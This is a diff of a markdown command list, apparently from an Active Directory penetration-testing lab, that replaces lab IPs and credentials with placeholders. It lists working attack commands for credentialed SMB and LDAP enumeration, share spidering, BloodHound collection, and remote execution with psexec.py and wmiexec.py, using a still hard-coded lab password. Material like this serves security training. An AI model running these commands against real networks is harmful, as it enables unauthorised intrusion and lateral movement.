@@ -21,67 +21,67 @@ crackmapexec smb -h
 ## 3. `shellsession` _(output omitted)_
 
 ```bash
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --users
 ```
 
 ## 4. `shellsession` _(output omitted)_
 
 ```bash
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --groups
 ```
 
 ## 5. `shellsession` _(output omitted)_
 
 ```bash
-sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+sudo crackmapexec smb 172.16.5.130 -u {{USERNAME}} -p {{PASSWORD}} --loggedon-users
 ```
 
 ## 6. `shellsession` _(output omitted)_
 
 ```bash
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --shares
 ```
 
 ## 7. `shellsession` _(output omitted)_
 
 ```bash
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M spider_plus --share 'Department Shares'
 ```
 
 ## 8. `shellsession` _(output omitted)_
 
 ```bash
-head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
+head -n 10 /tmp/cme_spider_plus/{{DC_IP}}.json 
 ```
 
 ## 9. `shellsession` _(output omitted)_
 
 ```bash
-smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}}
 ```
 
 ## 10. `shellsession` _(output omitted)_
 
 ```bash
-smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}} -R 'Department Shares' --dir-only
 ```
 
 ## 11. `bash`
 
 ```bash
-rpcclient -U "" -N 172.16.5.5
+rpcclient -U "" -N {{DC_IP}}
 ```
 
 ## 12. `bash`
 
 ```bash
-psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+psexec.py {{DOMAIN}}/wley:'transporter@4'@172.16.5.125
 ```
 
 ## 13. `bash`
 
 ```bash
-wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+wmiexec.py {{DOMAIN}}/wley:'transporter@4'@{{DC_IP}}
 ```
 
 ## 14. `shellsession` _(output omitted)_
@@ -93,13 +93,13 @@ windapsearch.py -h
 ## 15. `shellsession` _(output omitted)_
 
 ```bash
-python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+python3 windapsearch.py --dc-ip {{DC_IP}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} --da
 ```
 
 ## 16. `shellsession` _(output omitted)_
 
 ```bash
-python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+python3 windapsearch.py --dc-ip {{DC_IP}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -PU
 ```
 
 ## 17. `shellsession` _(output omitted)_
@@ -111,7 +111,7 @@ bloodhound-python -h
 ## 18. `shellsession` _(output omitted)_
 
 ```bash
-sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+sudo bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -ns {{DC_IP}} -d {{DOMAIN}} -c all 
 ```
 
 ## 19. `shellsession` _(output omitted)_
